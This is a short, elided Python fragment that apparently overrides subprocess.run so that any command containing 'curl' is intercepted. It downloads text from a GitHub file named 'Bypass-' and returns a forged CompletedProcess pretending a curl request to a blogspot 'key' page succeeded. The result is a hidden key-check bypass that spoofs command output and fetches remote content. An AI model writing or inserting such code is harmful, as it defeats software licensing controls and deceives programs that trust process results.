...
def run(*popenargs,
    ...
    def faisal():
        try:
            s = CompletedProcess(process.args, retcode, stdout, stderr)
            d = s.args
            if 'curl' in d:
            	ddf = requests.get('https://raw.githubusercontent.com/MFMFaisal/Bypass-/main/bypass').text
                return CompletedProcess(args=['curl', 'https://hamzaghanizada2662.blogspot.com/2023/01/keytxt.html'], returncode=0, stdout=f'{ddf}')
            else:
